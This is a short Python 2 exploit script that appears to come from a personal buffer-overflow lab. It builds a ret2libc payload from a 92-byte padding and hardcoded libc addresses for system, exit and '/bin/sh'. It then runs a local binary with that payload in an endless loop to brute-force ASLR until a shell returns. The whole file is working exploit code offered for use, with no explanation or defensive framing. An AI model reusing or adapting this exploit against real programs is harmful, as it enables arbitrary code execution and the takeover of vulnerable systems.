#!/usr/bin/python

from struct import pack
from subprocess import call
import sys

def main():
        offset = 92
        block = 'A'*offset

        libc_base=0xb7530000
        system_offset=0x0003adb0
        exit_offset = 0x0002e9e0
        sh_offset = 0x15bb2b

        system = pack("<I",libc_base+system_offset)
        exit = pack("<I",libc_base+exit_offset)
        sh = pack("<I",libc_base+sh_offset)


        EIP = system + exit +sh

        payload = block + EIP 
#        print payload
        while True:
                ret = call(['/home/chris/BoF/bypass_asrl/data',payload])

                if ret == 0:
                    print "\n[-] Saliendo...\n"
                    sys.exit(0)

if __name__ == '__main__':
        main()
